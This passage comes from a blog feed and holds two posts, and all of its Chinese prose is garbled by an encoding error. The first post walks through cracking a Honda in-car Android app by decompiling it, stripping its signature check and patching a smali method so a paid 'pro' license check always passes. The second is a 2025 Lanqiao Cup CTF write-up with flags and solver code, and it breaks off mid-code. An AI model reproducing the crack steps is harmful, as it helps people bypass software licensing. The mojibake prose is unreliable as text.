æ˜¯ç”¨çš„å¤œç¥æ¨¡æ‹Ÿå™¨</p><p>æ‰‹æœºappï¼šNPç®¡ç†å™¨ï¼š<a href="https://wwrm.lanzoue.com/i116u2s9esvi">https://wwrm.lanzoue.com/i116u2s9esvi</a></p><p>ä¸‹è½½ jadx-gui-1.5.1-with-jre-win.zipï¼š<a href="https://github.com/skylot/jadx/releases/tag/v1.5.1">https://github.com/skylot/jadx/releases/tag/v1.5.1</a></p><h3 id="ç¨‹åºè¿è¡Œ">ç¨‹åºè¿è¡Œ</h3><p>æ¨¡æ‹Ÿå™¨ä¸­æ‰“å¼€apkï¼Œé€‰æ‹©è½¦å‹ä¸ºæ€åŸŸ</p><p><img src="https://s2.loli.net/2025/05/07/ORG3SegKE8juxoM.png" alt="image"></p><p>å‘ç°æœ‰å¥½å¤šåŠŸèƒ½æ™®é€šç”¨æˆ·éƒ½ä¸èƒ½ä½¿ç”¨</p><p><img src="https://s2.loli.net/2025/05/07/Woi7CBPpxHjTNyO.png" alt="image"></p><p><img src="https://s2.loli.net/2025/05/07/ZD6Mphb2x4sLSz3.png" alt="image"></p><p><img src="https://s2.loli.net/2025/05/07/iBuXMVgclYWIrdk.png" alt="image"></p><h3 id="æ­£æ´»å¼€å§‹">æ­£æ´»å¼€å§‹</h3><p>å…³é”®è¯ï¼šâ€œéœ€è¦ä¸“ä¸šç‰ˆâ€</p><p>jadxæ‰“å¼€apkï¼Œæœç´¢éœ€è¦ä¸“ä¸šç‰ˆ</p><p><img src="https://s2.loli.net/2025/05/07/B54jc28TiXxgrvU.png" alt="image"></p><p>æ‰¾åˆ°keyï¼špro_function</p><p><img src="https://s2.loli.net/2025/05/07/TLbMxvpmljVOWci.png" alt="image"></p><p>æœç´¢keyï¼Œå®šä½å…³é”®å‡½æ•°</p><p><img src="https://s2.loli.net/2025/05/07/z8QPs2Tfukxbn5J.png" alt="image"></p><p>å‘ç°ç¬¬ä¸€ä¸ªå‡½æ•°æœ‰å¸¸é‡å­—ç¬¦ä¸²â€œ<a href="http://google.com">google.com</a>â€ï¼Œç¬¬å››ä¸ªå‡½æ•°åœ¨æ‰§è¡Œåˆ°åé¢éƒ¨åˆ†æ—¶ä¼šæ˜¾ç¤ºå¯¹è¯æ¡†ä¸”è¿”å›false</p><p><img src="https://s2.loli.net/2025/05/07/CyMw6dOiKbfE3HI.png" alt="image"></p><p>ä¹‹åç”¨npç®¡ç†å™¨å»é™¤apkç­¾å</p><p>NPç®¡ç†å™¨æ˜¯ä¸€æ¬¾ç”¨äºå®‰å“åº”ç”¨ç­¾åç®¡ç†çš„å·¥å…·ï¼Œå…¶æ ¸å¿ƒåŠŸèƒ½ä¸»è¦åŒ…æ‹¬ä»¥ä¸‹å‡ ç‚¹ï¼š</p><ol><li><strong>å»é™¤ç­¾åæ ¡éªŒ</strong>ï¼šèƒ½å¤Ÿç§»é™¤APKæ–‡ä»¶çš„æ•°å­—ç­¾åï¼Œä½¿å¾—ä¿®æ”¹åçš„APKæ–‡ä»¶å¯ä»¥ç»•è¿‡ç­¾åéªŒè¯ï¼Œé¿å…å› ç­¾åä¸ä¸€è‡´å¯¼è‡´çš„å®‰è£…å¤±è´¥ã€‚</li><li><strong>é‡æ–°ç­¾å</strong>ï¼šä¸ºå»é™¤ç­¾åæ ¡éªŒåçš„APKæ–‡ä»¶ç”Ÿæˆæ–°çš„ç­¾åï¼Œç¡®ä¿ä¿®æ”¹åçš„æ–‡ä»¶èƒ½å¤Ÿæ­£å¸¸å®‰è£…åˆ°å®‰å“è®¾å¤‡ä¸Šã€‚</li><li><strong>ç­¾åç®¡ç†</strong>ï¼šæ”¯æŒç®¡ç†å¤šä¸ªç­¾åå¯†é’¥ï¼Œæ–¹ä¾¿ç”¨æˆ·å¯¹ä¸åŒåº”ç”¨è¿›è¡Œç­¾åæ“ä½œï¼Œæé«˜ç­¾åç®¡ç†çš„çµæ´»æ€§ã€‚</li></ol><p>é¦–å…ˆå°†æ¨¡æ‹Ÿå™¨æ–­ç½‘ï¼Œè¦ä¸ç„¶npç®¡ç†å™¨ä¸€ç›´æç¤ºéœ€è¦æ›´æ–°</p><p><img src="https://s2.loli.net/2025/05/07/MluTHKEY6gN5Uh4.png" alt="image"></p><p>npç®¡ç†å™¨æå–å®‰è£…åŒ…ï¼Œå¯¹é»‘ç§‘æŠ€appè¿›è¡Œå»é™¤ç­¾åæ ¡éªŒ</p><p><img src="https://s2.loli.net/2025/05/07/kC7Em1WjT9Hi8uN.png" alt="image"></p><p>â€</p><p><img src="https://s2.loli.net/2025/05/07/NpiKPeCnW2BqcHy.png" alt="image"></p><p><img src="https://s2.loli.net/2025/05/07/dlt9N4p5uCs6a7E.png" alt="image"></p><p>å¯¹æ–°ç”Ÿæˆçš„æ–‡ä»¶ï¼ŒåŠ äº†killçš„æ–‡ä»¶ï¼Œç‚¹å‡»æŸ¥çœ‹ï¼Œç‚¹å‡»classes.dexæ–‡ä»¶è¿›è¡Œç¼–è¾‘ï¼Œæ‰“å¼€æ–¹å¼ï¼šDEXç¼–è¾‘å™¨PLUSï¼Œ<a href="http://xn--google-9v7ikb54j527dxvg54sio0dmmed7nc3he78g.com">æœç´¢ä»£ç ä¸­çš„å­—ç¬¦ä¸²å¸¸é‡google.com</a></p><p><img src="https://s2.loli.net/2025/05/07/a9VodvkphbXLEDO.png" alt="image"></p><p><img src="https://s2.loli.net/2025/05/07/5d4iVletRmjSzuP.png" alt="image">æ ¹æ®jadxçœ‹åˆ°çš„ä»£ç ç»“æ„ï¼Œç¬¬ä¸€ä¸ªå‡½æ•°è¿”å›google.comå­—ç¬¦ä¸²ï¼Œç¬¬å››ä¸ªå‡½æ•°æ‰§è¡Œåˆ°åé¢éƒ¨åˆ†æ—¶æ˜¾ç¤ºå¯¹è¯æ¡†ï¼Œä¸”è¿”å›falseï¼Œæˆ‘ä»¬å°±è®©å®ƒç¬¬ä¸€è¡Œè¿”å›trueï¼Œå…¶ä¸­ä»£ç ifå—é‡Œå°±è¿”å›true</p><p><img src="https://s2.loli.net/2025/05/07/APinf3KMLHDVUrI.png" alt="image"></p><p>smaliä¸­å‡½æ•°ä»¥.methodå¼€å¤´ï¼Œ.end methodç»“æŸï¼Œæˆ‘ä»¬ä»google.comæ‰€åœ¨çš„ç¬¬ä¸€ä¸ªå¾€ä¸‹æ•°ï¼Œæ‰¾åˆ°ç¬¬å››ä¸ªï¼ŒæŠŠå‡½æ•°ä¸­çš„ç¬¬ä¸€æ¬¡return trueå¤åˆ¶ï¼Œç²˜è´´åˆ°å‰é¢çš„ä½ç½®</p><p><img src="https://s2.loli.net/2025/05/07/hfL6vBjgUd7mEFQ.png" alt="image"></p><p>ä¿å­˜å¹¶é€€å‡ºï¼Œä¸€ç›´é€€å‡ºåˆ°ç¼–è¯‘</p><p><img src="https://s2.loli.net/2025/05/07/oBHFd7ORuZqIPVS.png" alt="image"></p><p>åˆ°æ­¤ï¼Œkillè¿™ä¸ªæ–‡ä»¶å·²ç»å¤„ç†å¥½äº†ï¼Œå¯ä»¥å®‰è£…è¿è¡Œäº†ï¼Œæˆ‘è¿™é‡ŒNPç®¡ç†å™¨é»˜è®¤è‡ªåŠ¨ç­¾åï¼Œå¯ä»¥æ‰“å¼€çœ‹ä¸€ä¸‹æ˜¯å¦æœ‰ç­¾å</p><p><img src="https://s2.loli.net/2025/05/07/lGqMEvRIkiuNDPf.png" alt="image"></p><p>æ¨¡æ‹Ÿå™¨åˆ é™¤appï¼Œé‡æ–°å®‰è£…killè¿™ä¸ªapkï¼Œæ‰“å¼€ï¼Œé€‰æ‹©è½¦å‹ä¼˜åŒ–ï¼Œç„¶åé‡å¯ï¼Œåœ¨æ²¡æ¿€æ´»å‰ï¼Œé«˜çº§åŠŸèƒ½ä¸‹é¢ç°å®çš„æ˜¯å‡çº§åˆ°ä¸“ä¸šç‰ˆï¼Œæ¿€æ´»åï¼Œæ˜¾ç¤ºçš„æ˜¯æŸ¥çœ‹æ³¨å†Œç <br>çœ‹çœ‹æŸ¥çœ‹æ³¨å†Œç æ˜¯nullï¼Œå› ä¸ºæˆ‘ä»¬è¿™æ˜¯ç›´æ¥è·³è¿‡äº†</p><p><img src="https://s2.loli.net/2025/05/07/9WzGPUoe4N6qdmD.png" alt="image"></p><p>é«˜çº§ç”¨æˆ·åŠŸèƒ½éƒ½è§£é”äº†</p><p><img src="https://s2.loli.net/2025/05/07/xI51uSmoGV9jrln.png" alt="image"></p><h3 id="æ€»ç»“">æ€»ç»“</h3><p>æ€»ä½“æ¥è¯´æ¯”è¾ƒç®€å•ï¼Œä¹Ÿå°±æ˜¯äº†è§£äº†ä¸€ä¸‹npç®¡ç†å™¨å»é™¤ç­¾åçš„åŠŸèƒ½ï¼Œå¤œç¥æ¨¡æ‹Ÿå™¨æœ‰ç‚¹ä¸å¥½ç”¨ï¼Œåè¾¹è¿˜æ˜¯æ¢æˆé›·ç¥å§</p>]]></content>
    
    
    <summary type="html">æœ¬ç”°è½¦è½½appç ´è§£</summary>
    
    
    
    <category term="App" scheme="https://www.thir0th.xyz/categories/App/"/>
    
    
    <category term="Android" scheme="https://www.thir0th.xyz/tags/Android/"/>
    
  </entry>
  
  <entry>
    <title>2025è“æ¡¥æ¯</title>
    <link href="https://www.thir0th.xyz/posts/f45c55ec.html"/>
    <id>https://www.thir0th.xyz/posts/f45c55ec.html</id>
    <published>2025-04-28T16:16:18.000Z</published>
    <updated>2025-04-29T08:20:50.095Z</updated>
    
    <content type="html"><![CDATA[<span id="more"></span><p>æ•´ä½“æ¥è¯´è¿˜æ˜¯æŒºç®€å•çš„ï¼Œå»å¹´çš„å”¯å”¯è¯ºè¯ºï¼Œä»Šå¹´çš„é‡æ‹³å‡ºå‡»ğŸ˜</p><h3 id="æ•°æ®åˆ†æ">æ•°æ®åˆ†æ</h3><h4 id="flowzip">flowzip</h4><p>wiresharkä¸Šä¼ åï¼Œctrl+Fæœç´¢å­—ç¬¦ä¸²flagï¼Œæ‰¾åˆ°flag</p><p><img src="https://s2.loli.net/2025/04/26/IX4Am8a9Or2coMK.png" alt="image-20250426103927875"></p><p>flag{c6db63e6-6459-4e75-bb37-3aec5d2b947b}</p><h4 id="ezEvtx">ezEvtx</h4><p>æ ¹æ®é¢˜ç›®æè¿°ï¼Œå³è¾¹ç­›é€‰ï¼Œé€‰æ‹©è­¦å‘Šä¹‹åå¯»æ‰¾</p><p><img src="https://s2.loli.net/2025/04/26/oIvEh27eVcUxPYz.png" alt="image-20250426104204020"></p><p>æ‰¾åˆ°æ–‡ä»¶åï¼Œæäº¤æ­£ç¡®</p><p><img src="https://s2.loli.net/2025/04/26/cLkAR17dfTVw36C.png" alt="image-20250426104256501"></p><p>flag{confidential.docx}</p><h3 id="å¯†ç ç ´è§£">å¯†ç ç ´è§£</h3><h4 id="Enigma">Enigma</h4><p>enigmaåŠ å¯†çš„ç‰¹æ€§å†³å®šçš„ï¼Œç›´æ¥æœç´¢enigmaï¼Œçœ‹æ˜¯ä¸æ˜¯æœ‰æ„ä¹‰çš„ï¼ŒflagåŒ…è£¹æäº¤æˆåŠŸ</p><p><img src="https://s2.loli.net/2025/04/26/Ic6yPfVABGjORCm.png" alt="image-20250426112547140"></p><p>flag{HELLOCTFERTHISISAMESSAGEFORYOU}</p><h4 id="easy-AES">easy_AES</h4><p>æ ¹æ®é¢˜ç›®æè¿°ï¼ŒçŸ¥é“è¦çˆ†ç ´key</p><p>é¢˜ç›®é‡‡ç”¨çš„æ˜¯ä¼ ç»Ÿçš„AESåŠ å¯†ï¼Œä½†æ˜¯å…¶ä¸­çš„keyä¼¼ä¹å¯ä»¥é€šè¿‡çˆ†ç ´å¾—åˆ°ï¼Œä½ èƒ½æ‰¾åˆ°å…¶ä¸­çš„é—®é¢˜ï¼Œè§£å¯†å‡ºæ•æ„Ÿæ•°æ®å—ï¼Ÿ</p><p>é€šè¿‡ gift = key0 &amp; key1 çš„ nibble çº§æ˜ å°„å…³ç³»ï¼Œæ„é€ æ¯ä¸ª key0 nibble çš„å¯èƒ½å–å€¼é›†åˆï¼Œå¹¶æ ¹æ® key1 ä¸­ç›¸åŒå€¼çš„å…¨å±€ä¸€è‡´æ€§è¿›è¡Œäº¤å‰çº¦æŸï¼Œæœ€ååˆ©ç”¨å›æº¯æšä¸¾å¯èƒ½çš„ key0ï¼ŒéªŒè¯æ˜¯å¦èƒ½æ­£ç¡®è§£å¯†å‡ºä»¥ flag{ å¼€å¤´çš„æ˜æ–‡</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> unpad</span><br><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> defaultdict</span><br><span class="line"></span><br><span class="line"><span class="comment"># å·²çŸ¥æ•°æ®</span></span><br><span class="line">gift = <span class="number">64698960125130294692475067384121553664</span></span><br><span class="line">key1_hex = <span class="string">&quot;74aeb356c6eb74f364cd316497c0f714&quot;</span></span><br><span class="line">cipher = <span class="string">b&#x27;\x36\xbf\x9b\xb1\x93\x14\x82\x9a\xa4\xc2\xaf\xd0L\xad\xbb5\x0e|&gt;\x8c|\xf0^dl~X\xc7R\xcaZ\xab\x16\xbe r\xf6Pl\xe0\x93\xfc)\x0e\x93\x8e\xd3\xd6&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># è¾“å…¥éªŒè¯</span></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(key1_hex) != <span class="number">32</span>:</span><br><span class="line">    <span class="keyword">raise</span> ValueError(<span class="string">&quot;key1_hex must be 32 hexadecimal characters&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(cipher) % <span class="number">16</span> != <span class="number">0</span>:</span><br><span class="line">    <span class="keyword">raise</span> ValueError(<span class="string">&quot;cipher length must be a multiple of 16 bytes&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(cipher) &lt; <span class="number">16</span>:</span><br><span class="line">    <span class="keyword">raise</span> ValueError(<span class="string">&quot;cipher is too short to contain valid plaintext&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># å°† gift æ‹†åˆ†æˆ 32 ä¸ª nibble</span></span><br><span class="line">gift_bin = <span class="built_in">format</span>(gift, <span class="string">&#x27;0128b&#x27;</span>)</span><br><span class="line">gift_nibbles = [<span class="built_in">int</span>(gift_bin[i*<span class="number">4</span>:(i+<span class="number">1</span>)*<span class="number">4</span>], <span class="number">2</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>)]</span><br><span class="line"></span><br><span class="line"><span class="comment"># å°† key1 æ‹†åˆ†æˆ 32 ä¸ª nibble</span></span><br><span class="line">key1_nibbles = [<span class="built_in">int</span>(key1_hex[i:i+<span class="number">1</span>], <span class="number">16</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>)]</span><br><span class="line"></span><br><span class="line"><span class="comment"># è®¡ç®—æ¯ä¸ªä½ç½®çš„å€™é€‰å€¼</span></span><br><span class="line">pos_cands = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">    m = key1_nibbles[i]</span><br><span class="line">    b = gift_nibbles[i]</span><br><span class="line">    cands = [x <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>) <span class="keyword">if</span> (x &amp; m) == b]</span><br><span class="line">    pos_cands.append(cands)</span><br><span class="line"></span><br><span class="line"><span class="comment"># æŒ‰ key1_nibble çš„å€¼åˆ†ç»„ï¼Œäº¤å‰çº¦æŸå¾—åˆ°æ¯ä¸ªå€¼çš„å€™é€‰é›†åˆ</span></span><br><span class="line">positions_by_y = defaultdict(<span class="built_in">list</span>)</span><br><span class="line"><span class="keyword">for</span> i, y <span class="keyword">in</span> <span class="built_in">enumerate</span>(key1_nibbles):</span><br><span class="line">    positions_by_y[y].append(i)</span><br><span class="line"></span><br><span class="line">y_cands = &#123;&#125;</span><br><span class="line"><span class="keyword">for</span> y, poses <span class="keyword">in</span> positions_by_y.items():</span><br><span class="line">    s = <span class="built_in">set</span>(pos_cands[poses[<span class="number">0</span>]])</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> poses[<span class="number">1</span>:]:</span><br><span class="line">        s &amp;= <span class="built_in">set</span>(pos_cands[i])</span><br><span class="line">    y_cands[y] = <span class="built_in">list</span>(s)</span><br><span class="line"></span><br><span class="line"><span class="comment"># å›æº¯æšä¸¾å…¨å±€åç½®æ¢ inv_map: y -&gt; x</span></span><br><span class="line">used = <span class="built_in">set</span>()</span><br><span class="line">inv_map = &#123;&#125;</span><br><span class="line">solutions = []</span><br><span class="line"></span><br><span class="line"><span class="comment"># æŒ‰å€™é€‰é›†å¤§å°å‡åºæ’åºï¼Œä¼˜å…ˆåˆ†é…çº¦æŸæœ€ä¸¥çš„ y</span></span><br><span class="line">items = <span class="built_in">sorted</span>(y_cands.items(), key=<span class="keyword">lambda</span> kv: <span class="built_in">len</span>(kv[<span class="number">1</span>]))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dfs</span>(<span class="params">idx</span>):</span><br><span class="line">    <span class="keyword">if</span> idx == <span class="built_in">len</span>(items):</span><br><span class="line">        key0_nibbles = [inv_map.get(y, <span class="number">0</span>) <span class="keyword">for</span> y <span class="keyword">in</span> key1_nibbles]</span><br><span class="line">        key0_hex = <span class="string">&quot;&quot;</span>.join(<span class="string">f&quot;<span class="subst">&#123;n:x&#125;</span>&quot;</span> <span class="keyword">for</span> n <span class="keyword">in</span> key0_nibbles)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="comment"># è½¬æ¢ä¸ºå­—èŠ‚å½¢å¼çš„å¯†é’¥</span></span><br><span class="line">            key0_bytes = <span class="built_in">bytes</span>.fromhex(key0_hex)</span><br><span class="line">            key1_bytes = <span class="built_in">bytes</span>.fromhex(key1_hex)</span><br><span class="line">            <span class="comment"># åŒé‡AES-CBCè§£å¯†</span></span><br><span class="line">            aes0 = AES.new(key0_bytes, AES.MODE_CBC, key1_bytes)</span><br><span class="line">            aes1 = AES.new(key1_bytes, AES.MODE_CBC, key0_bytes)</span><br><span class="line">            pt = unpad(aes0.decrypt(aes1.encrypt(cipher)), AES.block_size)</span><br><span class="line">            <span class="keyword">if</span> pt.startswith(<span class="string">b&quot;flag&#123;&quot;</span>):</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;Found correct key0: <span class="subst">&#123;key0_hex&#125;</span>&quot;</span>)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;Plaintext flag: <span class="subst">&#123;pt.decode()&#125;</span>&quot;</span>)</span><br><span class="line">                solutions.append((key0_hex, pt.decode()))</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">True</span>  <span class="comment"># æ‰¾åˆ°ä¸€ä¸ªè§£ååœæ­¢ï¼ˆå¯æ”¹ä¸º False æšä¸¾æ‰€æœ‰è§£ï¼‰</span></span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">pass</span>  <span class="comment"># è°ƒè¯•æ—¶å¯æ‰“å°ï¼šprint(f&quot;Decryption failed for key0 &#123;key0_hex&#125;: &#123;e&#125;&quot;)</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    y, cands = items[idx]</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> cands:</span><br><span class="line">        <span class="keyword">if</span> x <span class="keyword">in</span> used:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        inv_map[y] = x</span><br><span class="line">        used.add(x)</span><br><span class="line">        <span class="keyword">if</span> dfs(idx + <span class="number">1</span>):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        used.remove(x)</span><br><span class="line">        <span class="keyword">del</span> inv_map[y]</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># å¯åŠ¨å›æº¯</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Starting backtracking search...&quot;</span>)</span><br><span class="line">dfs(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> solutions:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;No valid solution found. Please check the following:&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;- gift and key1_hex are correct&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;- ciphertext matches the encryption logic&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;- Double AES-CBC encryption/decryption logic is consistent with the problem requirements&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Found <span class="subst">&#123;<span class="built_in">len</span>(solutions)&#125;</span> solutions&quot;</span>)</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2025/04/26/BhgIAb4Vctj3lqG.png" alt="image-20250426134920236"></p><h3 id="é€†å‘åˆ†æ">é€†å‘åˆ†æ</h3><h4 id="ShadowPhases">ShadowPhases</h4><p>rc4ï¼Œidaæ‰“å¼€ä¸€çœ¼é¡¶é’ˆï¼Œåœ¨strcmpå¤„ä¸‹æ–­ç‚¹ï¼Œwindows localè°ƒè¯•ï¼Œç‚¹è¿›str2ï¼Œå¾—åˆ°flag</p><p><img src="https://s2.loli.net/2025/04/26/gf8Kc3bMyeYh1dH.png" alt="image-20250426113647552"></p><p><img src="https://s2.loli.net/2025/04/26/j1PvIR9k6zb273i.png" alt="image-20250426113741748"></p><p>flag{0fa830e7-b699-4513-8e01-51f35b0f3293}</p><h4 id="BashBreaker">BashBreaker</h4><p>å…ˆæ˜¯ä¸€ä¸ªäºaiçš„å–å€¼å¯¹å±€ï¼Œaiå¾ˆè ¢ç›´æ¥èƒ½è¿‡ï¼Œå¾—åˆ°ä¸€ä¸ªå¯†é’¥ä¸çŸ¥é“æœ‰ä»€ä¹ˆç”¨</p><p><img src="https://img2023.cnblogs.com/blog/3445027/202504/3445027-20250426131532048-796554111.png" alt="image-20250426131530386"></p><p>ç¿»æ‰¾æ—è¾¹çš„å‡½æ•°è¡¨å¾—åˆ°æœ‰Rc4çš„é€»è¾‘ï¼Œç„¶ååˆå‘ç°ONE_PIECEç–‘ä¼¼å¯†æ–‡</p><p><img src="https://img2023.cnblogs.com/blog/3445027/202504/3445027-20250426131706759-1117293835.png" alt="image-20250426131706776"></p><p><img src="https://img2023.cnblogs.com/blog/3445027/202504/3445027-20250426131627335-1222269707.png" alt="image-20250426131627287"></p><p>ç›´æ¥dumpä¸‹æ¥é­”æ”¹rc4çš„é€»è¾‘è§£å¯†å°±å¥½äº†</p><p><img src="https://img2023.cnblogs.com/blog/3445027/202504/3445027-20250426131813662-1038064357.png" alt="image-20250426131813306"></p><p><img src="https://img2023.cnblogs.com/blog/3445027/202504/3445027-20250426131827694-136973100.png" alt="image-20250426131827528"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _BYTE unsigned char</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _DWORD unsigned int</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _QWORD unsigned long</span></span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> data[<span class="number">48</span>] = &#123;</span><br><span class="line">    <span class="number">0xBB</span>, <span class="number">0xCA</span>, <span class="number">0x12</span>, <span class="number">0x14</span>, <span class="number">0xD0</span>, <span class="number">0xF1</span>, <span class="number">0x99</span>, <span class="number">0xA7</span>, <span class="number">0x91</span>, <span class="number">0x48</span>, <span class="number">0xC3</span>, <span class="number">0x28</span>, <span class="number">0x73</span>, <span class="number">0xAD</span>, <span class="number">0xB7</span>, <span class="number">0x75</span>,</span><br><span class="line">    <span class="number">0x8C</span>, <span class="number">0x89</span>, <span class="number">0xCD</span>, <span class="number">0xDD</span>, <span class="number">0x2D</span>, <span class="number">0x50</span>, <span class="number">0x5D</span>, <span class="number">0x7F</span>, <span class="number">0x95</span>, <span class="number">0xB1</span>, <span class="number">0xA4</span>, <span class="number">0x9D</span>, <span class="number">0x09</span>, <span class="number">0x43</span>, <span class="number">0xE1</span>, <span class="number">0xD2</span>,</span><br><span class="line">    <span class="number">0xE9</span>, <span class="number">0x66</span>, <span class="number">0xEA</span>, <span class="number">0x18</span>, <span class="number">0x98</span>, <span class="number">0xC6</span>, <span class="number">0xCC</span>, <span class="number">0x02</span>, <span class="number">0x39</span>, <span class="number">0x18</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">__int64 __fastcall <span class="title function_">rc4_init</span><span class="params">(__int64 a1, __int64 a2, <span class="type">unsigned</span> __int64 a3)</span></span><br><span class="line">&#123;</span><br><span class="line">    __int64 result; <span class="comment">// rax</span></span><br><span class="line">    <span class="type">char</span> v4; <span class="comment">// [rsp+2h] [rbp-Eh]</span></span><br><span class="line">    <span class="type">int</span> j; <span class="comment">// [rsp+4h] [rbp-Ch]</span></span><br><span class="line">    <span class="type">int</span> v6; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line">    <span class="type">int</span> i; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt;= <span class="number">255</span>; ++i)</span><br><span class="line">        *(_BYTE*)(a1 + i) = i;</span><br><span class="line">    v6 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt;= <span class="number">255</span>; ++j)</span><br><span 